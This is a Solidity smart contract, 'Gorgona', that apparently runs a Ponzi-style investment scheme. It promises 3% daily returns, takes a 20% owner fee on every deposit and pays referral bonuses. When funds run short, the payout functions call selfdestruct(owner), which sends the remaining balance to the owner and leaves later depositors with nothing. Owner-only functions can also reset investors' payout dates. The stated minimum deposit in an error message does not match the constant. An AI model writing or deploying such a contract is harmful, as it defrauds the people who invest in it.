1 pragma solidity ^0.4.24;
2 
3 contract Gorgona {
4     address public owner;
5 
6     uint constant PAYOUT_PER_INVESTOR_INTERVAL = 10 minutes;
7     uint constant INTEREST = 3;
8     uint private PAYOUT_CUMULATIVE_INTERVAL = 10 minutes;
9     uint private MINIMUM_INVEST = 10000000000000000 wei;
10 
11     uint depositAmount;
12     uint investorCount;
13     uint public payoutDate;
14     uint public lastPaymentDate;
15 
16     struct investor
17     {
18         uint id;
19         uint deposit;
20         uint deposits;
21         uint date;
22         address referrer;
23     }
24 
25     address[] public addresses;
26 
27     mapping(address => investor) public investors;
28 
29     event Invest(address addr, uint amount);
30     event PayoutCumulative(uint amount, uint txs);
31     event PayoutSelf(address addr, uint amount);
32     event RefFee(address addr, uint amount);
33     event Cashback(address addr, uint amount);
34 
35     modifier onlyOwner {if (msg.sender == owner) _;}
36 
37     constructor() public {
38         owner = msg.sender;
39         addresses.length = 1;
40         payoutDate = now;
41     }
42 
43     function() payable public {
44         if (msg.value == 0) {
45             return;
46         }
47 
48         require(msg.value >= MINIMUM_INVEST, "Too small amount, minimum 0.001 ether");
49 
50         investor storage user = investors[msg.sender];
51 
52         if (user.id == 0) {
53             user.id = addresses.length;
54             addresses.push(msg.sender);
55             investorCount ++;
56 
57             // referrer
58             address referrer = bytesToAddress(msg.data);
59             if (investors[referrer].deposit > 0 && referrer != msg.sender) {
60                 user.referrer = referrer;
61             }
62         }
63 
64         // save investor
65         user.deposit += msg.value;
66         user.deposits += 1;
67         user.date = now;
68 
69         emit Invest(msg.sender, msg.value);
70         depositAmount += msg.value;
71         lastPaymentDate = now;
72 
73         // project fee
74         owner.transfer(msg.value / 5);
75 
76         // referrer commission for all deposits
77         if (user.referrer > 0x0) {
78             uint bonusAmount = (msg.value / 100) * INTEREST;
79             user.referrer.transfer(bonusAmount);
80             emit RefFee(user.referrer, bonusAmount);
81 
82             // cashback only for first deposit
83             if (user.deposits == 1) {
84                 msg.sender.transfer(bonusAmount);
85                 emit Cashback(msg.sender, bonusAmount);
86             }
87         }
88     }
89 
90     function payout(uint limit) public
91     {
92         require(now >= payoutDate + PAYOUT_CUMULATIVE_INTERVAL, "too fast payout request");
93 
94         uint investorsPayout;
95         uint txs;
96         uint amount;
97 
98         for (uint idx = addresses.length; --idx >= 1;)
99         {
100             address addr = addresses[idx];
101             if (investors[addr].date + 24 hours > now) {
102                 continue;
103             }
104 
105             amount = getInvestorUnPaidAmount(addr);
106             investors[addr].date = now;
107 
108             if (address(this).balance < amount) {
109                 selfdestruct(owner);
110                 return;
111             }
112 
113             addr.transfer(amount);
114 
115             investorsPayout += amount;
116             if (++txs >= limit) {
117                 break;
118             }
119         }
120 
121         payoutDate = now;
122         emit PayoutCumulative(investorsPayout, txs);
123     }
124 
125     function payoutSelf(address addr) public
126     {
127         require(addr == msg.sender, "You need specify your ETH address");
128 
129         require(investors[addr].deposit > 0, "deposit not found");
130         require(now >= investors[addr].date + PAYOUT_PER_INVESTOR_INTERVAL, "too fast payment required");
131 
132         uint amount = getInvestorUnPaidAmount(addr);
133         require(amount >= 1 finney, "too small unpaid amount");
134 
135         investors[addr].date = now;
136         if (address(this).balance < amount) {
137             selfdestruct(owner);
138             return;
139         }
140 
141         addr.transfer(amount);
142 
143         emit PayoutSelf(addr, amount);
144     }
145 
146     function getInvestorDeposit(address addr) public view returns (uint) {
147         return investors[addr].deposit;
148     }
149 
150     function getInvestorCount() public view returns (uint) {
151         return investorCount;
152     }
153 
154     function getDepositAmount() public view returns (uint) {
155         return depositAmount;
156     }
157 
158     function getInvestorDatePayout(address addr) public view returns (uint) {
159         return investors[addr].date;
160     }
161 
162     function getPayoutCumulativeInterval() public view returns (uint)
163     {
164         return PAYOUT_CUMULATIVE_INTERVAL;
165     }
166 
167     function setDatePayout(address addr, uint date) onlyOwner public
168     {
169         investors[addr].date = date;
170     }
171 
172     function setPayoutCumulativeInterval(uint interval) onlyOwner public
173     {
174         PAYOUT_CUMULATIVE_INTERVAL = interval;
175     }
176 
177     function getInvestorUnPaidAmount(address addr) public view returns (uint)
178     {
179         return (((investors[addr].deposit / 100) * INTEREST) / 100) * ((now - investors[addr].date) * 100) / 1 days;
180     }
181 
182     function bytesToAddress(bytes bys) private pure returns (address addr) {
183         assembly {
184             addr := mload(add(bys, 20))
185         }
186     }
187 }